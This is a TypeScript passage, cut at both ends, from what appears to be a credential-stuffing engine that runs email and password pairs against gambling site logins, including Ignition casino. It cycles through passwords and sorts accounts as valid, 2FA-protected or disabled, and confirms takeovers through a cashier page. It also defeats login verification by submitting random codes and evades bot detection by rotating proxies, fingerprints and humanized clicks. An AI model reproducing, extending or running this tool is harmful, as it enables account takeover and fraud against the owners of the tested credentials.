                this.log("INFO", `  ${site.name}: ✅ Response after re-press ${repress + 1}: ${status}`);
                response = status as LoginResponse;
                noResponseResolved = true;
                repressResolved = true;
                break;
              }

              const netDet = getNetworkDetection();
              if (netDet) {
                this.log("INFO", `  ${site.name}: 📡 Network detection after re-press ${repress + 1}: ${netDet}`);
                response = netDet;
                noResponseResolved = true;
                repressResolved = true;
                break;
              }

              // Check URL moved away from login
              if (this.isUrlChangedAwayFromLogin(site.url, page.url())) {
                this.log("INFO", `  ${site.name}: ✅ URL moved after re-press ${repress + 1} — possible success`);
                response = "success";
                noResponseResolved = true;
                repressResolved = true;
                break;
              }

              await new Promise(r => setTimeout(r, NO_RESPONSE_POLL_MS));
            }

            if (noResponseResolved) break;
          }

          // ── Cashier Fallback: 3 re-presses exhausted, no response ──
          if (!noResponseResolved) {
            this.log("WARN", `  ${site.name}: ⚠ 3 re-presses exhausted — checking cashier as silent success fallback`);
            const cashierOutcome = await this.performCashierVerification(page, site, cred);
            if (cashierOutcome === "success") {
              this.log("INFO", `  ${site.name}: ✅ Cashier confirmed silent success after 3 re-presses`);
              setLatestResponseClass("success");
              return await finalizeEvidenceClassification();
            } else {
              this.log("WARN", `  ${site.name}: ❌ Cashier bounced after 3 re-presses — infrastructure failure`);
              return { outcome: "N/A", attempts: attemptNum, reason: "no-response-cashier-bounce" };
            }
          }
        }
      }

      // ── Universal per-attempt screenshot ──────────────────────────────────────
      // Taken immediately after every response is classified, for every attempt.
      // 4 standard attempts = 4 shots. Extra attempts (verif bypass, rewinds)
      // add naturally so the total can exceed 10 per credential across sites.
      // The cashier redirect screenshot is the separate +1 shot (see performCashierVerification).
      try {
        await this.captureSettledScreenshot(
          page,
          `${site.name}:attempt-${attemptNum}-${response ?? "unknown"}`,
          250,
          false,
          { email: cred.email, target: site.name },
        );
      } catch { /* screenshot failure is non-fatal */ }

      if (response === "authenticator") {
        this.log("INFO", `  ${site.name}: 🔐 AUTHENTICATOR popup detected on attempt ${attemptNum} — credential valid, 2FA required`);
        return { outcome: "2FA", attempts: attemptNum };
      }

      if (response === "verify-phone") {
        this.log("INFO", `  ${this.formatEmail(cred.email)}: ✅ VERIFY YOUR PHONE / +61 detected on attempt ${attemptNum} — terminal success (no cashier check)`);
        return { outcome: "success", attempts: attemptNum, bypassCashierVerification: true };
      }

      // Upgrade 6: Honeypot Detection
      if (response === "honeypot" || (typeof response === "string" && (response.includes("under review") || response.includes("upload identity")))) {
        this.log("WARN", `  🚨 ${site.name}: Honeypot / Identity Verification detected on attempt ${attemptNum} — credential valid but unusable. Skipping.`);
        flowTracer.recordEvent({ type: "outcome", session_id: (page as any).__sessionId ?? "unknown", email: cred.email, site: site.name, message: "Outcome: honeypot" });
        return { outcome: "honeypot", attempts: attemptNum, bypassCashierVerification: true };
      }

      if (response === "cashier-bounce") {
        this.log("WARN", `  🚨 ${site.name}: Cashier Bounced to Login. Flagging for Human Review.`);
        flowTracer.recordEvent({ type: "outcome", session_id: (page as any).__sessionId ?? "unknown", email: cred.email, site: site.name, message: "Outcome: N/A - cashier bounce" });
        return { outcome: "N/A", attempts: attemptNum, reason: "cashier-bounce-human-review" };
      }

      if (response === "ignition-verification" || response === "pin-misdirection") {
        const trigger = response === "ignition-verification" ? "LOGIN VERIFICATION" : "UPDATE YOUR PIN";
        const url = (() => { try { return page.url(); } catch { return ""; } })();

        // ── "SUBMIT RAND NO. FOR IGNITION LOGIN POPUP" toggle ──────────────────
        // When enabled and this is the Ignition LOGIN VERIFICATION popup:
        // 1. Type a random 6-digit number into the verification input
        // 2. Triple-click the confirm/submit button to dismiss
        // 3. Treat the attempt as "incorrect" — retry the same password
        if (response === "ignition-verification" && ignitionVerifBypass) {
          this.log("INFO", `  🎲 ${site.name}: LOGIN VERIFICATION bypass — submitting random 6-digit code and retrying password`);
          try {
            // Generate a random 6-digit code (100000–999999)
            const randCode = String(Math.floor(100000 + Math.random() * 900000));

            // Probe for the verification input — try common OTP/code selectors
            const verifInputSel = await page.evaluate(() => {
              // Phase 1: CSS attribute probes
              const candidates = [
                'input[name*="code" i]', 'input[name*="verif" i]', 'input[name*="otp" i]',
                'input[name*="pin" i]', 'input[placeholder*="code" i]', 'input[placeholder*="verif" i]',
                'input[type="number"]', 'input[inputmode="numeric"]',
                'input[autocomplete="one-time-code"]',
                '.modal input[type="text"]', '.popup input[type="text"]',
              ];
              for (const sel of candidates) {
                const el = document.querySelector(sel);
                if (el && (el as HTMLElement).offsetParent !== null) return sel;
              }
              // Phase 2: Find by nearby label text ("Enter Code", "Verification Code", etc.)
              const labels = document.querySelectorAll('label, .label, [class*="label"]');
              for (const lbl of labels) {
                const txt = (lbl.textContent || "").trim().toLowerCase();
                if (txt.includes("code") || txt.includes("verif") || txt.includes("otp") || txt.includes("pin")) {
                  // Check for a `for` attribute linking to an input
                  const forAttr = (lbl as HTMLLabelElement).htmlFor;
                  if (forAttr) {
                    const linked = document.getElementById(forAttr) as HTMLInputElement | null;
                    if (linked && linked.offsetParent !== null) {
                      return `#${forAttr}`;
                    }
                  }
                  // Check next sibling or child input
                  const sibInput = lbl.nextElementSibling?.querySelector?.("input") ??
                    lbl.nextElementSibling as HTMLInputElement | null;
                  if (sibInput?.tagName === "INPUT" && sibInput.offsetParent !== null) {
                    if (sibInput.id) return `#${sibInput.id}`;
                    return 'input[type="text"]';
                  }
                  const childInput = lbl.parentElement?.querySelector("input") as HTMLInputElement | null;
                  if (childInput && childInput.offsetParent !== null) {
                    if (childInput.id) return `#${childInput.id}`;
                    return 'input[type="text"]';
                  }
                }
              }
              // Phase 3: Last resort — any visible text input
              const fallback = document.querySelector('input[type="text"]');
              if (fallback && (fallback as HTMLElement).offsetParent !== null) return 'input[type="text"]';
              return null;
            }).catch(() => null);

            if (verifInputSel) {
              // Use evaluate + event dispatch instead of bare page.fill() to sync with React virtual DOM
              await page.evaluate(({ sel, code }: { sel: string; code: string }) => {
                const el = document.querySelector(sel);
                if (!el) return;
                (el as HTMLInputElement).focus();
                (el as HTMLInputElement).value = code;
                el.dispatchEvent(new Event('input', { bubbles: true }));
                el.dispatchEvent(new Event('change', { bubbles: true }));
              }, { sel: verifInputSel, code: randCode }).catch(() => { });
              this.log("DEBUG", `  ${site.name}: Filled verification input (${verifInputSel}) with ${randCode}`);
            } else {
              this.log("WARN", `  ${site.name}: No verification input found — proceeding with triple-click only`);
            }

            // Triple-click the verification submit button
            const verifSubmitSel = await page.evaluate(() => {
              // Phase 1: CSS selector probes (by class/type)
              const cssCandidates = [
                '.modal button[type="submit"]', '.popup button[type="submit"]',
                'button[type="submit"]', 'button[class*="confirm" i]',
                'button[class*="submit" i]', 'button[class*="verif" i]',
                'button[class*="continue" i]', 'button[class*="proceed" i]',
                '.modal button', '.popup button',
              ];
              for (const sel of cssCandidates) {
                const el = document.querySelector(sel);
                if (el && (el as HTMLElement).offsetParent !== null) return sel;
              }
              // Phase 2: Text-content matching — scan all visible buttons for
              // "CONTINUE", "SUBMIT", "VERIFY", "CONFIRM", "PROCEED" text.
              // Ignition's ol-button components may not have recognisable class names.
              const textPatterns = /^(continue|submit|verify|confirm|proceed|send|ok)$/i;
              const allButtons = document.querySelectorAll('button, [role="button"], a.btn, a.button');
              for (const btn of allButtons) {
                const el = btn as HTMLElement;
                if (el.offsetParent === null) continue; // hidden
                const txt = (el.textContent || "").trim();
                if (textPatterns.test(txt)) {
                  // Build a unique selector for this button
                  if (el.id) return `#${el.id}`;
                  if (el.className && typeof el.className === "string") {
                    const cls = el.className.split(/\s+/).filter(c => c.length > 0).slice(0, 2).join(".");
                    if (cls) return `button.${cls}`;
                  }
                  // Fallback: use nth-of-type
                  const parent = el.parentElement;
                  if (parent) {
                    const siblings = Array.from(parent.querySelectorAll(":scope > button"));
                    const idx = siblings.indexOf(el);
                    if (idx >= 0) return `button:nth-of-type(${idx + 1})`;
                  }
                  return "button"; // last resort
                }
              }
              return null;
            }).catch(() => null);

            if (verifSubmitSel) {
              // Triple-click: three rapid clicks with tiny gap between each
              await humanClickSelector(page, verifSubmitSel, { clickCount: 3, force: true }).catch(() => { });
              this.log("DEBUG", `  ${site.name}: Triple-clicked verification submit (${verifSubmitSel})`);
            } else {
              this.log("WARN", `  ${site.name}: No verification submit button found`);
            }

            // Brief settle — let the page react to the bad code before retrying
            await this.sleep(Math.round(gaussianClamped(800, 250, 400, 1400)));

            // Clear the in-page status so the poll loop doesn't re-trigger
            await page.evaluate(() => {
              const STATUS_SYM = Symbol.for("cloak_status");
              (window as any)[STATUS_SYM] = null;
            }).catch(() => { });
            resetNetworkDetection();

            // Re-navigate to login and restart this same attempt index
            // (same password, as if we received "incorrect" from the server)
            this.log("INFO", `  ${site.name}: Retrying password attempt ${attemptNum} after LOGIN VERIFICATION bypass`);
            await this.gotoWithRetry(page, site.url, 3);
            await this.armCookieCoordinateDismissal(page, site.name);
            lastResponse = "incorrect";
            attemptIdx--; // loop will increment back to same index → same password retried
            continue;
          } catch (bypassErr: unknown) {
            this.log("WARN", `  ${site.name}: LOGIN VERIFICATION bypass failed: ${(bypassErr instanceof Error ? bypassErr.message : String(bypassErr)) || bypassErr} — falling through to burn`);
            // Fall through to legacy burn path below
          }
        }
        // ── End bypass ─────────────────────────────────────────────────────────

        if (site.name === "ignition" && ignitionResets < 1) {
          ignitionResets++;
          this.log("WARN", `  🚨 ${site.name}: ${trigger} detected — Performing Deep-State Reset & Alternative Restart...`);

          try {
            await page.context().clearCookies();
            await page.evaluate(() => {
              localStorage.clear();
              sessionStorage.clear();
            }).catch(() => { });
          } catch { /* session detached */ }

          const altUrl = "https://www.ignitioncasino.eu/login";
          this.log("INFO", `  ↪ Navigating to alternative Ignition URL: ${altUrl}`);
          await this.gotoWithRetry(page, altUrl, 3);
          await this.armCookieCoordinateDismissal(page, site.name);

          attemptIdx = -1;
          lastResponse = null;
          resetNetworkDetection();
          continue;
        }

        this.log("ERR", `  🚨 ${site.name}: ${trigger} on attempt ${attemptNum} — rotating identity (personality transplant)...`);
        return {
          outcome: "N/A",
          attempts: attemptNum,
          reason: "misdirection",
          misdirection: { url, trigger },
          requeueCredential: true,
        };
      }

      if (attemptIdx === 0 && response === "other" && !otherRewindUsed) {
        otherRewindUsed = true;
        this.log("WARN", `  ${site.name}: ⚠ attempt 1 returned "other" — likely cookie-banner interception, retrying as do-over`);
        await this.armCookieCoordinateDismissal(page, site.name);
        await this.smartAttemptPause(page);
        lastResponse = null;
        resetNetworkDetection();
        attemptIdx--;
        continue;
      }

      if (response === "success" || response === "other" || response === "incorrect") {
        this.log("INFO", `  ${site.name}: Potential outcome ("${response}") detected! Validating via mandatory cashier check to ensure no hidden successes...`);
        // We wait a brief moment for the application to settle, but no extended banner waiting.
        await this.sleep(1000);

        const rootRedirectVerification = await this.confirmRootRedirectViaCashier(page, site, `attempt ${attemptNum}`);
        if (rootRedirectVerification === "success") {
          const isVisuallyConfirmed = await verifyLoginSuccessVisually(page);
          if (isVisuallyConfirmed) {
            this.log("INFO", `  ${this.formatEmail(cred.email)}: ✅ AI visually confirmed login success on attempt ${attemptNum} (was originally ${response})`);
            setLatestResponseClass("success");
              return await finalizeEvidenceClassification();
          } else {
            this.log("WARN", `  ${site.name}: AI visual verification rejected the success classification. Flagging as "success-unconfirmed".`);
            response = "success-unconfirmed";
            // Do not return here, let it fall through to the unconfirmed block below
          }
        }

        // If the cashier check fails or bounces back to login, we override/preserve the outcome
        if (rootRedirectVerification === "unconfirmed") {
          if (response === "success") {
            this.log("WARN", `  ${site.name}: ${response} overridden — Cashier verification failed. Flagging as "success-unconfirmed".`);
            response = "success-unconfirmed";
          } else if (response === "incorrect") {
            this.log("WARN", `  ${site.name}: Cashier verification failed. Confirmed password is truly incorrect.`);
          } else {
            this.log("WARN", `  ${site.name}: ${response} overridden — Cashier verification failed. Demoting to "other".`);
            response = "other";
          }
          lastResponse = response;
          if (attemptNum < 4 && response !== "success-unconfirmed") {
            await this.smartAttemptPause(page);
            continue;
          } else if (response === "success-unconfirmed") {
            // We treat success-unconfirmed as a terminal outcome (don't keep retrying passwords)
            return { outcome: response as Outcome, attempts: attemptNum };
          }
          this.log("WARN", `  ${site.name}: ${response} on attempt 4 — confirmed no_account`);
          await this.smartAttemptPause(page);
          setLatestResponseClass("incorrect");
          return await finalizeEvidenceClassification();
        }

        // Fallback if verification logic itself was skipped/disabled by config
        if (response === "incorrect") {
          this.log("INFO", `  ${site.name}: Cashier check bypassed, proceeding with "incorrect" outcome.`);
          // If bypassed, we need to manually continue the loop for incorrect passwords
          lastResponse = response;
          if (attemptNum < 4) {
            await this.smartAttemptPause(page);
            continue;
          }
          setLatestResponseClass("incorrect");
          return await finalizeEvidenceClassification();
        } else {
          this.log("INFO", `  ${this.formatEmail(cred.email)}: ✅ login success on attempt ${attemptNum} (cashier check not configured)`);
          setLatestResponseClass("success");
              return await finalizeEvidenceClassification();
        }
      }

      if (cred.isGolden) {
        this.log("ERR", `  🚨 ${site.name}: GOLDEN CREDENTIAL returned "${response}" instead of success! Treating as bot misdirection.`);
        return {
          outcome: "N/A",
          attempts: attemptNum,
          reason: "misdirection",
          misdirection: { url: page.url(), trigger: `golden_cred_failed_${response}` },
          requeueCredential: true,
        };
      }

      const pageTitle = (await page.title().catch(() => "")).toLowerCase();
      const pageText = ((await page.evaluate(SHADOW_DOM_TEXT_EXTRACTOR).catch(() => "")) as string).toLowerCase();
      if (pageTitle.includes("captcha") || pageTitle.includes("challenge") || pageTitle.includes("verify") ||
        pageText.includes("please verify you are a human") || pageText.includes("bot detection")) {
        this.log("WARN", `  ${site.name}: ⚠️ Bot challenge detected! Throwing BurnedFingerprintError to rotate IP/Fingerprint.`);
        // Per-attempt screenshot (above) already captured the page state — no extra shot needed
        throw new BurnedFingerprintError();
      }

      if (response === "disabled") {
        this.log("ERR", `  ${site.name}: account permanently disabled on attempt ${attemptNum}`);
        setLatestResponseClass("perm_disabled");
        const decision = await finalizeEvidenceClassification();
        await page.goto('about:blank', { timeout: 5000 }).catch(() => { });
        return decision;
      }

      if (response === "tempdisabled") {
        await page.waitForLoadState('networkidle', { timeout: 10000 }).catch(() => { });
        setLatestResponseClass("temp_disabled");
        const decision = await finalizeEvidenceClassification();
        await page.goto('about:blank', { timeout: 5000 }).catch(() => { });
        return decision;
      }

      // ── Humanization reading pauses have been removed for absolute speed ──

      lastResponse = response;
      if (attemptNum < 4) {
        this.log("WARN", `  ${site.name}: ${response} on attempt ${attemptNum} — trying next password`);
        await page.waitForLoadState('networkidle', { timeout: 2000 }).catch(() => { });
        // Removed massive multi-second interDelay to ensure millisecond optimization
      } else {
        this.log("WARN", `  ${site.name}: ${response} on attempt 4 — confirmed no_account`);
        await page.waitForLoadState('networkidle', { timeout: 2000 }).catch(() => { });
        setLatestResponseClass("incorrect");
          return await finalizeEvidenceClassification();
      }
    }

    if (submitEvidence.length === 0) {
      return { outcome: "skipped", attempts: 0, reason: "drift-abort" };
    }
    return await finalizeEvidenceClassification();
  }
  // eslint-disable-next-line @typescript-eslint/require-await
  private async armCookieCoordinateDismissal(page: Page, siteName: string): Promise<void> {
    const existingTask = (page as any).__cookieCoordinateClickerPromise as Promise<void> | undefined;
    if (existingTask) return;

    const task = (async () => {
      await page.waitForLoadState("networkidle", { timeout: 1500 }).catch(() => { });
      if (page.isClosed()) return;
      await this.sleep(1500);
      const startedAt = Date.now();
      const maxRuntimeMs = 12_000;
      let loggedCalibration = false;

      while (!page.isClosed() && Date.now() - startedAt < maxRuntimeMs) {
        const calibration = await page.evaluate(() => {
          const state = (window as any).__cookieAcceptCalibration;
          return {
            dismissed: Boolean((window as any).__cookieDismissed),
            calibration: state ? {
              phrase: state.phrase,
              text: state.text,
              originalX: state.originalX,
              originalY: state.originalY,
              normalizedX: state.normalizedX,
              normalizedY: state.normalizedY,
              viewportWidth: state.viewportWidth,
              viewportHeight: state.viewportHeight,
            } : null,
          };
        }).catch(() => ({ dismissed: true, calibration: null as any }));

        if (calibration.dismissed) break;
        if (calibration.calibration) {
          const viewport = page.viewportSize() || { width: 1280, height: 720 };
          const scaledX = calibration.calibration.normalizedX * viewport.width;
          const scaledY = calibration.calibration.normalizedY * viewport.height;
          const clickX = Math.round(Math.max(1, Math.min(viewport.width - 1, scaledX + gaussianClamped(0, 1.35, -4, 4))));
          const clickY = Math.round(Math.max(1, Math.min(viewport.height - 1, scaledY + gaussianClamped(0, 1.35, -4, 4))));
          if (!loggedCalibration) {
            this.log("INFO", `  🍪 ${siteName}: calibrated Accept All click target (${calibration.calibration.originalX},${calibration.calibration.originalY}) @ ${calibration.calibration.viewportWidth}x${calibration.calibration.viewportHeight} → scaled to current viewport`);
            loggedCalibration = true;
          }
          await humanMouseMove(page, clickX, clickY, 0.9).catch(() => { });
          await humanClickAt(page, clickX, clickY).catch(() => { });
        }
        await this.sleep(300);
      }
    })().finally(() => {
      delete (page as any).__cookieCoordinateClickerPromise;
    });

    (page as any).__cookieCoordinateClickerPromise = task;
  }

  /**
   * Show-password fallback. All selector tables live in `login-flow.ts`
   * (the canonical source); this method just translates a successful
   * click into the same per-page "we already tried" cache that
   * `clickShowPasswordCanonical` would maintain if it owned the cache.
   */
  private async clickShowPassword(page: Page, siteName: string, passwordSelector?: string): Promise<void> {
    const clicked = await clickShowPasswordCanonical(page, siteName, passwordSelector);
    if (clicked && clicked !== "already_revealed") {
      this.log("INFO", `  👁 Clicked show-password via: ${clicked}`);
    } else if (passwordSelector && clicked !== "already_revealed") {
      this.log("DEBUG", `  show-password toggle present but click had no effect — leaving field masked`);
    }
  }

  /**
   * Smart pacing: wait 200ms, then watch for DOM mutations.
   * If a mutation occurs, wait 500ms for the DOM to settle.
   * If no mutations happen within a fallback window, unblock anyway.
   */
  private async smartAttemptPause(page: Page): Promise<void> {
    try {
      await this.sleep(200);
      await page.evaluate(() => {
        return new Promise<void>((resolve) => {
          let timeout: NodeJS.Timeout | null = null;
          let fallbackTimeout: NodeJS.Timeout | null = null;
          const observer = new MutationObserver(() => {
            if (timeout) clearTimeout(timeout);
            timeout = setTimeout(() => {
              observer.disconnect();
              if (fallbackTimeout) clearTimeout(fallbackTimeout);
              resolve();
            }, 500);
          });
          observer.observe(document.body, { childList: true, subtree: true, attributes: true, characterData: true });

          fallbackTimeout = setTimeout(() => {
            observer.disconnect();
            if (timeout) clearTimeout(timeout);
            resolve();
          }, 3000);
        });
      });
    } catch {
      await this.sleep(2500); // fallback if page detached
    }
  }

  private async captureSettledScreenshot(
    page: Page,
    label: string,
    settleMs: number = DynamicTimings.POST_SUBMIT_DOM_SETTLE,
    waitNetworkIdle = true,
    ctx?: { email?: string; target?: string },
  ): Promise<void> {
    if (waitNetworkIdle) {
      await page.waitForLoadState("networkidle", { timeout: DynamicTimings.POST_SUBMIT_NETWORKIDLE_TIMEOUT }).catch(() => { });
    }
    await this.sleep(settleMs);
    await this.captureScreenshot(page, label, ctx);
  }

  private async captureScreenshot(
    page: Page,
    label: string,
    ctx?: { email?: string; target?: string; saveDom?: boolean },
  ): Promise<void> {
    const email = ctx?.email ?? this.currentEmail;
    const rowIdx = this.rows.findIndex(r => r.email === email);
    const backend = rowIdx >= 0 ? this.rows[rowIdx]?.backend : undefined;
    const result = await this._screenshotSvc.capture(page, {
      label,
      email,
      target: ctx?.target ?? this.currentTarget,
      backend,
      proxyPool: this.config?.proxyPool,
      inputMode: this.config?.parallelSiteTesting ? "Parallel" : "Sequential",
      concurrency: this.config?.concurrency,
      bypass: this.config?.stealthBypassHttpCloak,
      cloak: this.config?.useHttpCloak,
    });
    if (result) {
      this.log("SNAP", `📸 ${label} → ${result.relativePath}`);
      this._consecutiveScreenshotFails = 0; // reset on success

      const isFinalOutcome = /(success|bounced|failure|noaccount|disabled|captcha)/i.test(label);
      if (ctx?.saveDom || isFinalOutcome) {
        try {
          const domPath = path.join(path.dirname(result.path), path.basename(result.path).replace(/\.[^/.]+$/, "") + ".html");
          const html = await page.content();
          await fs.promises.writeFile(domPath, html);
          this.log("SNAP", `📄 Saved DOM snapshot → ${path.basename(domPath)}`);
        } catch (e) {
          this.log("DEBUG", `Failed to save DOM: ${String(e)}`);
        }
      }

      import('./database.js').then(({ saveEvidenceChecksum }) => {
        if (result.hash) {
          const rowIdx = this.rows.findIndex(r => r.email === (ctx?.email ?? this.currentEmail));
          const sessionId = rowIdx >= 0 ? this.rows[rowIdx]?.sessionId : undefined;
          saveEvidenceChecksum(sessionId, result.relativePath, "screenshot", result.hash);
        }
      }).catch(e => this.log("DEBUG", `Failed to dynamically import database.js: ${e}`));
    } else {
      this._consecutiveScreenshotFails++;
      this.log("WARN", `  ⚠ Screenshot failed (${this._consecutiveScreenshotFails}/${AutomationEngine.SCREENSHOT_FAIL_THRESHOLD} consecutive)`);
      if (this._consecutiveScreenshotFails >= AutomationEngine.SCREENSHOT_FAIL_THRESHOLD) {
        const rowIdx = this.rows.findIndex(r => r.email === (ctx?.email ?? this.currentEmail));
        const hasRecording = rowIdx >= 0 && !!this.rows[rowIdx]?.recordingUrl;
        if (!hasRecording) {
          this._consecutiveScreenshotFails = 0; // reset before throw
          throw new Error("CRITICAL FAULT: 4 consecutive screenshot failures with no active recording. Automation aborted to preserve evidence integrity.");
        } else {
          this.log("WARN", `  ⚡ ${this._consecutiveScreenshotFails} screenshot failures but recording is active — continuing`);
        }
      }
    }
  }

  private async captureSpidernewScreenshot(
    sp: any,
    label: string,
    ctx?: { email?: string; target?: string },
  ): Promise<void> {
    try {
      const b64 = await sp.screenshot().catch(() => null);
      if (!b64) throw new Error("spider.screenshot() returned null");
      const buf = Buffer.from(b64, "base64");
      const result = await this._screenshotSvc.captureFromBuffer(buf, {
        label,
        email: ctx?.email ?? this.currentEmail,
        target: ctx?.target ?? this.currentTarget,
      });
      if (result) {
        this.log("SNAP", `📸 ${label} → ${result.relativePath}`);
        import('./database.js').then(({ saveEvidenceChecksum }) => {
          if (result.hash) {
            const rowIdx = this.rows.findIndex(r => r.email === (ctx?.email ?? this.currentEmail));
            const sessionId = rowIdx >= 0 ? this.rows[rowIdx]?.sessionId : undefined;
            saveEvidenceChecksum(sessionId, result.relativePath, "screenshot", result.hash);
          }
        }).catch(e => this.log("DEBUG", `Failed to dynamically import database.js: ${e}`));
      } else {
        throw new Error("_screenshotSvc.captureFromBuffer returned null");
      }
    } catch (e: unknown) {
      this.log("WARN", `  spider-cloud screenshot failed for ${label}: ${e instanceof Error ? e.message : String(e)}`);
      throw new Error("CRITICAL FAULT: Screenshot capture failed. Automation aborted to preserve evidence integrity.");
    }
  }
  private triggerRowUpdate(idx: number | RowStatus | undefined): void {
    if (idx === undefined) return;
    const i = typeof idx === 'number' ? idx : this.rows.findIndex(r => r === idx);
    if (i >= 0) {
      const row = this.rows[i];
      if (row && row.status === "done" && !(row as any)._prometheusCounted) {
        (row as any)._prometheusCounted = true;
        // Determine aggregate outcome for the metric
        let aggregateOutcome = "unknown";
        for (const s of Object.values(row.sites)) {
          if (s.outcome && s.outcome !== "queued" && s.outcome !== "testing") {
            aggregateOutcome = s.outcome;
            break;
          }
        }
        import('./metrics.js').then(m => m.engineRowsProcessed.inc({ outcome: aggregateOutcome, backend: row.backend || "unknown" })).catch(() => { });
      }
      this.emit("row-update", structuredClone(row));
    }
  }

  private emitExperimentalStats(configs: ExperimentalConfig[]): void {
    this.emit("experimental-stats", structuredClone(configs));
  }

  /**
   * Generate a comprehensive diagnostic report for a rotation mode
   * after all backends have been eliminated. Writes JSON to rotation-reports/
   * and emits a dashboard event.
   */
  private async generateRotationReport(config: EngineConfig): Promise<void> {
    if (!config.rotationTracking) return;
    const modeName = config.rotationModeName || "🔄 Rotation";
    const total = config.rotationTracking.length;

    const diagnostic = {
      mode: modeName,
      timestamp: new Date().toISOString(),
      totalBackendsTested: total,
      eliminationThreshold: config.rotationEliminationThreshold || 5,
      totalAttempts: config.rotationTracking.reduce((a, c) => a + c.totalAttempts, 0),
      totalDurationMs: config.rotationTracking.reduce((a, c) => a + c.totalDurationMs, 0),
      backends: config.rotationTracking.map(c => ({
        backend: c.backend,
        attempts: c.totalAttempts,
        decisive: c.decisive,
        blocks: c.blocks,
        fails: c.fails,
        errors: c.errors,
        avgDurationMs: c.totalAttempts > 0 ? Math.round(c.totalDurationMs / c.totalAttempts) : 0,
        successRate: c.totalAttempts > 0 ? Math.round((c.decisive / c.totalAttempts) * 100) : 0,
      })),
      recommendations: [] as string[],
      autoFixesApplied: [] as string[],
    };

    // Generate recommendations based on aggregate error patterns
    const allErrors = config.rotationTracking.flatMap(c => Object.entries(c.errors));
    const errorAgg: Record<string, number> = {};
    for (const [sig, count] of allErrors) errorAgg[sig] = (errorAgg[sig] || 0) + count;

    if ((errorAgg["cloudflare block"] || 0) > total * 2) {
      diagnostic.recommendations.push("CRITICAL: Cloudflare blocks dominate — proxy pool is likely burned. Rotate ALL proxy endpoints immediately.");
    }
    if ((errorAgg["proxy connect error"] || 0) > total) {
      diagnostic.recommendations.push("HIGH: Proxy connection failures detected — check proxy provider uptime and credentials.");
    }
    if ((errorAgg["timeout"] || 0) > total) {
      diagnostic.recommendations.push("MEDIUM: Excessive timeouts — target may be rate-limiting. Consider reducing concurrency or adding delay.");
    }
    if ((errorAgg["selector failed"] || 0) > total) {
      diagnostic.recommendations.push("HIGH: Selector failures detected — target website may have changed its DOM. Login flow selectors need updating.");
    }
    if ((errorAgg["other"] || 0) > total) {
      diagnostic.recommendations.push("MEDIUM: Unclassified errors detected — manual investigation needed to identify root cause.");
    }

    // Performance-based recommendations
    const avgSuccessRate = diagnostic.backends.reduce((a, b) => a + b.successRate, 0) / (diagnostic.backends.length || 1);
    if (avgSuccessRate < 10) {
      diagnostic.recommendations.push("CRITICAL: Average success rate below 10% — fundamental connectivity or detection issue. Full proxy + fingerprint reset recommended.");
    } else if (avgSuccessRate < 30) {
      diagnostic.recommendations.push("HIGH: Average success rate below 30% — significant detection issues. Consider switching to a different proxy provider.");
    }

    // Backend-specific analysis
    const headedBackends = diagnostic.backends.filter(b => b.backend.includes("headed"));
    const headlessBackends = diagnostic.backends.filter(b => !b.backend.includes("headed"));
    const headedAvgSuccess = headedBackends.length > 0 ? headedBackends.reduce((a, b) => a + b.successRate, 0) / headedBackends.length : 0;
    const headlessAvgSuccess = headlessBackends.length > 0 ? headlessBackends.reduce((a, b) => a + b.successRate, 0) / headlessBackends.length : 0;
    if (headedAvgSuccess > headlessAvgSuccess * 2 && headlessBackends.length > 0) {
      diagnostic.recommendations.push("INFO: Headed backends significantly outperform headless — target may have headless detection. Consider switching to headed-only modes.");
    }
    if (headlessAvgSuccess > headedAvgSuccess * 2 && headedBackends.length > 0) {
      diagnostic.recommendations.push("INFO: Headless backends significantly outperform headed — headed overhead may be hurting. Consider switching to headless-only modes.");
    }

    if (diagnostic.recommendations.length === 0) {
      diagnostic.recommendations.push("INFO: No dominant error pattern detected — failures distributed across multiple root causes. Manual investigation recommended.");
    }

    // Write report to file
    try {
      const reportDir = path.join(process.cwd(), 'rotation-reports');
      await fs.promises.mkdir(reportDir, { recursive: true }).catch(() => { });
      const reportPath = path.join(reportDir, `rotation-report-${Date.now()}.json`);
      await fs.promises.writeFile(reportPath, JSON.stringify(diagnostic, null, 2));
      this.log("INFO", `📋 Rotation diagnostic report saved to: ${reportPath}`);
    } catch (e) {
      this.log("ERROR", `Failed to write rotation diagnostic report: ${String(e)}`);
    }

    // Emit to dashboard
    this.emit("rotation-report", diagnostic);
  }

  /**
   * Apply auto-fixes based on the rotation diagnostic report.
   * Implements remediation for common failure patterns:
   * - Cloudflare dominance → concurrency reduction + proxy rotation
   * - Proxy failures → trigger proxy rotate URL
   * - Timeouts → reduce concurrency
   * - After fixes, reset elimination state for a fresh retry pass
   */
  private applyRotationAutoFixes(config: EngineConfig): void {
    if (!config.rotationTracking) return;
    const modeName = config.rotationModeName || "🔄 Rotation";
    const fixes: string[] = [];

    // Aggregate errors across all tracked backends
    const errorAgg: Record<string, number> = {};
    for (const t of config.rotationTracking) {
      for (const [sig, count] of Object.entries(t.errors)) {
        errorAgg[sig] = (errorAgg[sig] || 0) + count;
      }
    }

    // Fix 1: Cloudflare blocks → reduce concurrency to 1 + trigger proxy rotation
    if ((errorAgg["cloudflare block"] || 0) > config.rotationTracking.length) {
      if (config.concurrency > 1) {
        const oldConcurrency = config.concurrency;
        config.concurrency = 1;
        fixes.push(`Concurrency reduced: ${oldConcurrency} → 1 (cloudflare dominance)`);
        this.log("WARN", `${modeName} AUTO-FIX: Concurrency reduced to 1 due to cloudflare block dominance`);
      }
      if (config.proxyRotateUrl) {
        try {
          fetch(config.proxyRotateUrl).catch(() => { });
          fixes.push(`Proxy rotation triggered via URL: ${config.proxyRotateUrl}`);
          this.log("WARN", `${modeName} AUTO-FIX: Proxy rotation URL triggered`);
        } catch (e) {
          this.log("ERROR", `${modeName} AUTO-FIX: Proxy rotation URL failed: ${String(e)}`);
        }
      }
    }

    // Fix 2: Proxy connect errors → reduce concurrency
    if ((errorAgg["proxy connect error"] || 0) > config.rotationTracking.length) {
      if (config.concurrency > 2) {
        const oldConcurrency = config.concurrency;
        config.concurrency = Math.max(1, Math.floor(config.concurrency / 2));
        fixes.push(`Concurrency halved: ${oldConcurrency} → ${config.concurrency} (proxy connect errors)`);
        this.log("WARN", `${modeName} AUTO-FIX: Concurrency halved due to proxy connect errors`);
      }
    }

    // Fix 3: Timeouts → reduce concurrency slightly
    if ((errorAgg["timeout"] || 0) > config.rotationTracking.length * 2) {
      if (config.concurrency > 1) {
        const oldConcurrency = config.concurrency;
        config.concurrency = Math.max(1, config.concurrency - 1);
        fixes.push(`Concurrency decremented: ${oldConcurrency} → ${config.concurrency} (excessive timeouts)`);
